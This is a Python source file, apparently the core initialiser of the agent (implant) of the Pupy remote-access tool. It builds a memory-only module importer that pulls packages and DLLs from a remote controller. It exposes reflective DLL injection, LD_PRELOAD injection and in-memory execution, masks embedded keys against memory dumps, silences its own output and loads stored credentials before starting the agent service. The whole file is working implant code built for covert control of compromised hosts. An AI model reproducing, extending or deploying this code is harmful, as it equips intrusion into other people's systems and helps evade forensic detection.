# -*- coding: utf-8 -*-
# ------------------------------------------------------------------------------
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice,
#    this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
#    this list of conditions and the following disclaimer in the documentation
#    and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors
#    may be used to endorse or promote products derived from this software
#    without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE
# ------------------------------------------------------------------------------

# Public API

__all__ = (
    'EXTS_SOURCES', 'EXTS_COMPILED', 'EXTS_NATIVE', 'EXTS_ALL',
    'Blackhole', 'DummyPackageLoader', 'PupyPackageLoader',

    'config', 'dlls', 'client', 'revision',

    'namespace', 'set_broadcast_event', 'broadcast_event',
    'obtain',

    'manager', 'Task', 'Manager',

    'is_supported', 'is_native',

    'make_module',
    'get_arch', 'load_dll', 'is_shared',
    'reflective_inject_dll', 'ld_preload_inject_dll', 'mexec',
    'set_exit_session_callback', 'find_function_address',

    'set_pupy_config',

    'set_debug', 'get_debug', 'dprint', 'remote_error', 'get_logger',
    'get_pending_log',

    'update_module_dict',

    'main'

)
import sys
import marshal
import gc
import _imp

os_ = None


for module in ('nt', 'posix'):
    if module in sys.builtin_module_names:
        os_ = __import__(module)

import importlib.util as imputil


if sys.version_info.major > 2:
    xrange = range


def _stub(*args, **kwargs):
    raise NotImplementedError()


def is_supported(function):
    return hasattr(function, '__call__') and function != _stub


# Pupy client API

client = None
config = {}

try:
    import _pupy

    # Reset search paths ASAP

    #del sys.meta_path[:]
    del sys.path[:]
    del sys.path_hooks[:]

    sys.path_importer_cache.clear()

    from _pupy import (
        get_arch, is_shared
    )

    from _pupy import load_dll as _load_dll
    from _pupy import import_module as _import_module

    if hasattr(_pupy, 'revision'):
        from _pupy import revision
    else:
        revision = None

    if hasattr(_pupy, 'reflective_inject_dll'):
        from _pupy import reflective_inject_dll
    else:
        reflective_inject_dll = _stub

    if hasattr(_pupy, 'ld_preload_inject_dll'):
        from _pupy import ld_preload_inject_dll
    else:
        ld_preload_inject_dll = _stub

    if hasattr(_pupy, 'mexec'):
        from _pupy import mexec
    else:
        mexec = _stub

    if hasattr(_pupy, 'set_exit_session_callback'):
        from _pupy import set_exit_session_callback
    else:
        set_exit_session_callback = _stub

    if hasattr(_pupy, 'find_function_address'):
        from _pupy import find_function_address
    else:
        find_function_address = _stub

    def is_native():
        return True

except ImportError:
    def is_shared():
        return False

    def is_native():
        return False

    _import_module = _stub
    _load_dll = _stub
    get_arch = _stub
    set_exit_session_callback = _stub
    find_function_address = _stub
    revision = None
    mexec = _stub


EXTS_SOURCES = ('.py',)
EXTS_COMPILED = ('.pye', '.pyo', '.pyc')
ABI = str(sys.version_info[0])
EXTS_NATIVE = ('.pyd', '.so', '.dll', '.abi'+ABI+'.so', '.abi'+ABI+'.pyd')
EXTS_ALL = EXTS_NATIVE + EXTS_COMPILED + EXTS_SOURCES
ANY_INIT = tuple(
    '__init__' + ext for ext in EXTS_SOURCES + EXTS_COMPILED
)

MODULE_CLASS = sys.__class__

__debug = False
__debug_file = None
__debug_pending = []
__trace = False
__dprint_method = None

pupy_modules = None
dlls = {}

pupy_hooks = None
import_module = None
LOGGER = None

creds_cache = {}
namespace = None
obtain = None
manager = None
Task = None
Manager = None

_pywintypes = None

aliases = {
    'Cryptodome': 'Crypto',
}

direct_load = {
    # 'pywintypes': 'pywintypes27.dll',
    # 'pythoncom': 'pythoncom27.dll'
}




def update_module_dict(mod):
    pupy_modules.update(mod)

def get_pending_log():
    log = __debug_pending[:]
    del __debug_pending[:]
    return log


def set_pupy_config(new_config):
    config.clear()
    config.update(new_config)


def set_broadcast_event(callback):
    if not client:
        # Not ready?
        return

    client.set_broadcast_event(callback)


def broadcast_event(eventid, *args, **kwargs):
    if not client:
        return

    client.broadcast_event(eventid, *args, **kwargs)


def get_logger(name):
    global LOGGER
    if LOGGER is None:
        from .logger import create_root_logger
        LOGGER = create_root_logger()
    return LOGGER.getChild(name)


def set_stdio(null=False):
    if os_:
        try:
            os_.fstat(sys.stdout.fileno())
            os_.fstat(sys.stderr.fileno())
        except Exception:
            null = True

    if null:
        sys.stdout = Blackhole()
        sys.stderr = Blackhole()


def set_debug(is_enabled):
    global __debug
    
    if is_enabled:
        sys.tracebacklimit = 20
        __debug = True
        setattr(sys, "__debug", True)

    else:
        sys.tracebacklimit = 0
        __debug = False
        setattr(sys, "__debug", False)


def get_debug():
    return __debug, __debug_file


def dprint(msg, *args, **kwargs):
    if not (__dprint_method or __debug or getattr(sys, "__debug", False)):
        return

    if args or kwargs:
        if '%%' in msg:
            msg = msg % tuple(args)
        else:
            msg = msg.format(*args, **kwargs)

    error = None

    try:
        if __dprint_method:
            __dprint_method(msg)
            return

        elif not isinstance(sys.stderr, Blackhole):
            sys.stderr.write(msg)
            sys.stderr.write('\n')
            sys.stderr.flush()
            return

    except Exception as e:
        error = e

    __debug_pending.append(msg)

    if error:
        __debug_pending.append(error)


def remote_error(message, *args, **kwargs):
    try:
        import traceback
        exception_info = str(traceback.format_exc())
        message += '\n' + exception_info
    except ImportError:
        pass
    
    if not pupy_hooks.remote_print_error:
        dprint(message, *args, **kwargs)
        return

    if args and '%%' in message:
        message = message % tuple(args)
    elif args or kwargs:
        message = message.format(*args, **kwargs)

    try:
        pupy_hooks.remote_print_error(message)
    except Exception as e:
        dprint('Error: {}, message={}', e, message)
        return


def loadpy(src, dst, masked=False):
    src = bytes(src)
    content = src

    if masked:
        # Poors man "obfuscation", just to reduce (a bit) amount of our
        # plaintext keys in mem dump
        content = bytearray(len(src))
        for i, x in enumerate(src):
            content[i] = chr(
                ord(x) ^ ((2 ** ((65535 - i) % 65535)) % 251)
            )

    try:
        exec (marshal.loads(bytes(content)), dst)
    except Exception as e:
        message = str(e)
        try:
            import traceback
            exception_info = str(traceback.format_exc())
            message += '\n' + exception_info + '\nAT:\n'
            message += ''.join(traceback.format_stack())
        except ImportError:
            pass

        dprint("Failed call loadpy: " + message)
        raise


def import_module(data, initname, fullname, path):
    if not is_supported(_import_module):
        return None

    spec = imputil.spec_from_loader(fullname, loader=None)
    return _import_module(data, initname, fullname, path, spec)


def load_dll(name, buf=None):
    if not is_supported(_load_dll):
        return None

    if name in dlls:
        return dlls[name]

    cleanup_name = False

    if buf is None:
        if name in pupy_modules.modules:
            buf = pupy_modules.modules[name]
            cleanup_name = True
        else:
            return None

    handle = _load_dll(name, buf)
    if handle:
        dlls[name] = handle

        if cleanup_name:
            del pupy_modules.modules[name]

        return handle

    return None


def _get_module_files(fullname, path=None):
    """ return the file to load """

    maybe_path = fullname.replace('.', '/')
    if not path:
        path = maybe_path
    elif path.startswith('pupy://'):
        path = path[7:]
        if not maybe_path.startswith(path + '/'):
            path += '/' + maybe_path
        else:
            path = maybe_path
    else:
        if not maybe_path.startswith(path + '/'):
            path += '/' + maybe_path
        else:
            path = maybe_path

    while '//' in path:
        path = path.replace('//', '/')

    dprint("Search in modules: " + path)

    files = [
        module for module in pupy_modules.modules
        if module.rsplit('.', 1)[0] == path or any([
            (
                path + '/__init__' + ext == module
            ) for ext in EXTS_ALL
        ])
    ]
    dprint("Potential files found in memory: %s"%files)

    return files


def get_module_files(fullname, paths=[None]):
    dprint(
        "get_module_files({}, {})".format(
            repr(fullname), repr(paths)
        )
    )

    for path in paths:
        files = _get_module_files(fullname, path)
        if files:
            return files

    return []


def make_module(fullname, path=None, is_pkg=False, mod=None):
    if mod is None:
        #mod = imp.new_module(fullname)
        spec = imputil.spec_from_loader(fullname, loader=None)
        mod = imputil.module_from_spec(spec)

    mod.__name__ = str(fullname)
    mod.__file__ = str(
        'pupy://{}'.format(path or fullname + '.py')
    )

    if is_pkg:
        mod.__path__ = [
            str(mod.__file__.rsplit('/', 1)[0])
        ]
        mod.__package__ = str(fullname)
    else:
        mod.__package__ = str(fullname.rsplit('.', 1)[0])

    original_module = sys.modules.get(fullname)
    if original_module:
        # Looks like a reload
        for (alias, module) in sys.modules.items():
            if module is original_module:
                sys.modules[alias] = mod

    sys.modules[fullname] = mod
    return mod


class Blackhole(object):
    def _do_nothing(self, *args, **kwargs):
        pass

    read = write = flush = close = _do_nothing


class DummyPackageLoader(object):
    __slots__ = ('fullname')

    def __init__(self, fullname):
        self.fullname = fullname

    def load_module(self, fullname):
        return sys.modules[self.fullname]


class PupyPackageLoader(object):
    __slots__ = (
        'fullname', 'contents', 'extension',
        'is_pkg', 'path', 'archive'
    )

    def __init__(self, fullname, contents, extension, is_pkg, path):
        self.fullname = fullname
        self.contents = contents
        self.extension = extension
        self.is_pkg = is_pkg
        self.path = path
        self.archive = ''

    def __repr__(self):
        return f"'pupy://{self.path}'"

    def _rename_aliased(self, fullname):
        for alias, aliased in aliases.items():
            if not fullname.startswith(alias):
                continue

            parts = fullname.split('.')
            if parts[0] == alias:
                parts[0] = aliased

            new_fullname = '.'.join(parts)

            dprint('Rename: {} -> {}'.format(
                fullname, new_fullname))

            return new_fullname

        return fullname

    def _make_module(self, fullname, mod=None):
        return make_module(fullname, self.path, self.is_pkg, mod)

    def load_module(self, fullname):
        _imp.acquire_lock()
        try:
            fullname = self._rename_aliased(fullname)

            if fullname in sys.modules:
                return sys.modules[fullname]

            dprint('loading module {} (ext: {})', fullname, self.extension)
            extension = '.' + self.extension

            mod = None
            if extension in EXTS_SOURCES:
                dprint('Load {} from source file ({})'.format(
                    fullname, self.extension))

                mod = self._make_module(fullname)
                code = compile(self.contents, mod.__file__, 'exec')
                exec (code, mod.__dict__)

            elif extension in EXTS_COMPILED:
                dprint('Load {} from marshalled file ({})'.format(
                    fullname, self.extension))

                try:
                    mod = self._make_module(fullname)
                    loadpy(
                        self.contents[8:],
                        mod.__dict__,
                        self.extension == 'pye'
                    )
                except Exception as e:
                    remote_error('Load {} failed: Exception: {}'.format(
                        fullname, e))
                    raise

            elif extension in EXTS_NATIVE:
                if not is_supported(_import_module):
                    raise ImportError(
                        'memimporter interface is not initialized yet')
                if sys.version_info[0]==3:
                    initname = 'PyInit_' + fullname.rsplit('.', 1)[-1]
                else:
                    initname = 'init' + fullname.rsplit('.', 1)[-1]

                dprint('Load {} from native file {}'.format(
                    fullname, self.path))
                mod = import_module(self.contents, initname, fullname, self.path)
                dprint('mod to load : {}'.format(mod))
                self._make_module(fullname, mod)

            else:
                raise ImportError('Unsupported extension {}'.format(
                    self.extension))

        except Exception as e:
            if fullname in sys.modules:
                del sys.modules[fullname]

            remote_error(
                'Error loading package {} ({} pkg={})',
                fullname, self.path, self.is_pkg
            )
            raise

        finally:
            self.contents = None
            _imp.release_lock()
            gc.collect()

        return sys.modules[fullname]


class PupyPackageFinderImportError(ImportError):
    __slots__ = ()

import _frozen_importlib_external as _bootstrap_external
class PupyPackageFinder(_bootstrap_external._LoaderBasics):
    __slots__ = ('path', 'locals', 'globals')

    search_lock = None
    search_set = set()

    def __init__(self, path):
        dprint("PupyPackageFinder for {}".format(path))
        if type(path) == bytes:
            path = path.decode('utf8', 'replace')
        if path and not path.startswith('pupy://'):
            raise PupyPackageFinderImportError()

        self.path = path[7:].replace('\\', '/')
        self.locals = locals()
        self.globals = globals()

    @staticmethod
    def init_search_lock():
        from threading import Lock
        PupyPackageFinder.search_lock = Lock()

    def _rename_aliased(self, fullname):
        for alias, aliased in aliases.items():
            if not fullname.startswith(alias):
                continue

            if fullname.startswith(alias):
                parts = fullname.split('.')
                if parts[0] == alias:
                    parts[0] = aliased
                    fullname = '.'.join(parts)
                    return fullname

        return fullname

    def _is_already_loaded(self, fullname):
        parts = fullname.split('.')[:-1]

        for i in xrange(len(parts)):
            part = '.'.join(parts[:i+1])
            if part in pupy_modules.modules or part in sys.modules:
                return True

        return False

    def _remote_load_packages(self, fullname, second_pass):
        remote_load_package=pupy_hooks.remote_load_package
        dprint("remote_load_package : %s"% remote_load_package)
        if not remote_load_package or second_pass:
            return
        if self._is_already_loaded(fullname):
            return None

        from pupy.agent.utils import pupy_add_package, safe_obtain

        if PupyPackageFinder.search_lock is not None:
            with PupyPackageFinder.search_lock:
                if fullname in PupyPackageFinder.search_set:
                    return None
                else:
                    PupyPackageFinder.search_set.add(fullname)

        try:
            dprint('Remote load package {}'.format(fullname))
            packages, dlls = remote_load_package(fullname)
            dprint('Remote load package {} - success'.format(fullname))
            if not packages and not dlls:
                dprint('Remote load package {} - not found'.format(fullname))
            else:
                if dlls:
                    dlls = safe_obtain(dlls)
                    for name, blob in dlls:
                        load_dll(name, blob)

                if packages:
                    pupy_add_package(packages, True, fullname)

                if fullname in sys.modules:
                    return DummyPackageLoader(fullname)

                return self.find_module(fullname, second_pass=True)

        except Exception as e:
            dprint('Exception: {}'.format(e))

        finally:
            if PupyPackageFinder.search_lock is not None:
                with PupyPackageFinder.search_lock:
                    PupyPackageFinder.search_set.remove(fullname)

    def iter_modules(self, fullname, path=None):
        spath = self.path+'/'
        lpath = len(spath)

        for module in list(pupy_modules.modules):
            if not module.startswith(spath):
                continue

            sub_path = module[lpath:]
            first, rest = sub_path.split('/', 1)
            if first.endswith(EXTS_ALL):
                yield first.rsplit('.', 1)[0], False
            elif '.' not in first and rest in ANY_INIT:
                yield first, True

    def find_module(self, fullname, path=None, second_pass=False):
        dprint('Find module')
        if fullname.startswith('exposed_'):
            return None

        fullname = self._rename_aliased(fullname)

        if fullname in sys.modules:
            return DummyPackageLoader(fullname)

        dprint('Find module: {}/{}'.format(fullname, second_pass))

        if not second_pass:
            _imp.acquire_lock()

        selected = None

        try:
            files = None

            if fullname in direct_load:
                direct_load_name = direct_load[fullname]
                files = get_module_files(direct_load_name)
            else:
                files = get_module_files(fullname)

            if not is_supported(_import_module):
                dprint('[L] _import_module is not supported ... find_module: filter out native libs')
                files = [
                    f for f in files if not f.lower().endswith(EXTS_NATIVE)
                ]

            if not files:
                files = []

                dprint(
                    '{} not found in {}: not in {} files'.format(
                        fullname, files, len(files)
                    )
                )

                return self._remote_load_packages(fullname, second_pass)

            criterias = (
                lambda f: any([
                    f.endswith('/__init__'+ext) for ext in (
                        EXTS_COMPILED + EXTS_SOURCES
                    )
                ]),
                lambda f: f.endswith(EXTS_NATIVE),
                lambda f: f.endswith(EXTS_COMPILED),
                lambda f: f.endswith(EXTS_SOURCES),
            )

            selected = None
            for criteria in criterias:
                for candidate in files:
                    if criteria(candidate):
                        selected = candidate
                        break

            if not selected:
                dprint('{} not selected from {}', fullname, files)
                return None

            del files[:]

            content = pupy_modules.modules[selected]
            dprint(
                '{} found in "{}" / size = {}',
                fullname, selected, len(content)
            )

            extension = selected.rsplit(".", 1)[1].strip().lower()
            is_pkg = any([
                selected.endswith('/__init__'+ext) for ext in (
                    EXTS_COMPILED + EXTS_SOURCES
                )
            ])

            dprint('--> Loading {} ({}) package={}'.format(
                fullname, selected, is_pkg))

            return PupyPackageLoader(
                fullname, content, extension, is_pkg, selected
            )

        except Exception as e:
            dprint('--> Loading {} failed: {}/{}'.format(fullname, e, type(e)))
            if 'traceback' in sys.modules:
                import traceback
                traceback.print_exc(e)

            raise

        finally:
            if selected and selected in pupy_modules.modules:
                dprint('[L] {} remove {} from bundle / count = {}'.format(
                    fullname, selected, len(pupy_modules.modules)))
                del pupy_modules.modules[selected]

            if not second_pass:
                _imp.release_lock()

            gc.collect()

    def __repr__(self):
        return 'PupyPackageFinder({!r})'.format(self.path)



def initialize_basic_windows_modules():
    dprint('Initialize basic windows modules')
    try:
        if 'pywintypes27.dll' in pupy_modules.modules:
            dprint('Load pywintypes')
            load_dll('pywintypes27.dll', pupy_modules.modules['pywintypes27.dll'])
            del pupy_modules.modules['pywintypes27.dll']

            dprint('Load pywin32 loader')
            import _win32sysloader  # noqa
    except (NotImplementedError, WindowsError, ImportError) as e:
        dprint("Failed to load pywin32 loader: " + str(e))
        # We will try to leave without them..
        # This may happen on default python27 install
        pass

    from pupy.agent.winerror_hacks import apply_winerror_hacks

    # Enable unicode descriptions for windows errors
    apply_winerror_hacks()


def load_pupyimporter(stdlib=None):

    try:
        gc.set_threshold(128)
    except NotImplementedError:
        pass

    if stdlib:
        pupy_modules.modules.update(stdlib)


    if is_native():
        dprint('Install pupyimporter (standalone)')
        sys.path = ["pupy://"]
        sys.path_hooks = [PupyPackageFinder]
        #sys.meta_path = [PupyPackageFinder("pupy://")]

    else:
        dprint('Install pupyimporter + local packages')
        sys.path.insert(0, 'pupy://')
        sys.path_hooks.append(PupyPackageFinder)

    sys.path_importer_cache.clear()

    PupyPackageFinder.init_search_lock()

    if is_native():
        # fixup some modules that were not imported correctly during bootstrap
        # TODO: investigate a cleaner way
        del sys.modules["collections"]
        del sys.modules["collections.abc"]
        import collections.abc
        import collections
        collections # use collections to ignore an IDE warning

        import pupy
        setattr(pupy, 'agent', sys.modules['pupy.agent'])

    if sys.platform == 'win32':
        initialize_basic_windows_modules()


def init_pupy(argv, stdlib, debug=False):
    global LOGGER
    global __dprint_method
    global __debug_file

    set_stdio(null=not debug)
    set_debug(debug)

    dprint(
        'init_pupy: argv={} sys.argv={}',
        repr(argv), repr(sys.argv)
    )

    if sys.argv != argv:
        setattr(sys, 'real_argv', list(sys.argv))
        sys.argv = argv

    if hasattr(sys.platform, 'addtarget'):
        sys.platform.addtarget(None)

    setup_hooks()
    setup_modules()
    load_pupyimporter(stdlib)

    LOGGER = get_logger('pupy')


    if debug:
        from .logger import enable_debug_logger
        __debug_file = enable_debug_logger(LOGGER)

        for pending in __debug_pending:
            if isinstance(pending, Exception):
                LOGGER.exception(pending)
            else:
                LOGGER.error(pending)

        del __debug_pending[:]

    __dprint_method = LOGGER.debug

    import platform

    platform._syscmd_uname = lambda *args, **kwargs: ''

    if is_supported(get_arch):
        platform.architecture = lambda *args, **kwargs: (
            '64bit' if '64' in get_arch() else '32bit', ''
        )


def load_memimporter_fallback():
    global _import_module
    global _load_dll

    if not is_supported(_import_module):
        try:
            from .memimporter import load_dll, import_module

            _import_module = import_module
            _load_dll = load_dll
        except ImportError:
            import traceback
            dprint('memimporter is not available')
            dprint(traceback.format_exc(), error=True)


def setup_credentials(config):
    if 'credentials' not in config:
        return

    credentials = make_module('pupy_credentials')
    for cred, value in config.pop('credentials').items():
        setattr(credentials, cred, value)


def setup_manager():
    global Task
    global Manager
    global manager

    from .pstore import PStore
    from .manager import Task as _Task
    from .manager import Manager as _Manager

    pstore_dir = config.get('pstore', '~')

    Manager = _Manager
    Task = _Task
    manager = Manager(PStore(pstore_dir))

    import pupy.agent
    setattr(pupy.agent, "Manager", _Manager)
    setattr(pupy.agent, "Task", _Task)
    setattr(pupy.agent, "manager", manager)


def setup_network():
    from pupy.network.conf import load_modules
    load_modules()


def setup_obtain():
    global obtain

    from pupy.agent.utils import safe_obtain
    obtain = safe_obtain

def setup_hooks():
    global pupy_hooks
    dprint("setting up hooks")
    pupy_hooks = make_module('pupy_hooks')
    setattr(pupy_hooks, "remote_load_package", None)
    setattr(pupy_hooks, "remote_print_error", None)

def setup_modules():
    global pupy_modules
    dprint("setting up modules")
    pupy_modules = make_module('pupy_modules')
    setattr(pupy_modules, "modules", {})


def prepare(argv=sys.argv, debug=False, config={}, stdlib=None):
    set_pupy_config(config)

    if config.get('debug', False):
        debug = True

    init_pupy(argv, stdlib, debug)

    dprint("Apply dl_hacks..")

    if "rustc" not in sys.version:
        from .dl_hacks import apply_dl_hacks
        apply_dl_hacks()
    setup_obtain()

    dprint("Register pupyimporter..")

    from pupy.agent.utils import register_pupyimporter
    register_pupyimporter()

    dprint("Prepare rest..")

    from .handlers import set_sighandlers
    from .ssl_hacks import apply_ssl_hacks
    from .psutil_hacks import apply_psutil_hacks

    from pupy.network.conf import load_network_modules

    set_sighandlers()
    apply_ssl_hacks()
    apply_psutil_hacks()
    load_memimporter_fallback()
    setup_credentials(config)
    setup_manager()
    load_network_modules()

    dprint("Prepare complete")


def main(argv=sys.argv, debug=False, config={}, stdlib=None):
    prepare(argv, debug, config, stdlib)

    from .service import run
    run(config)
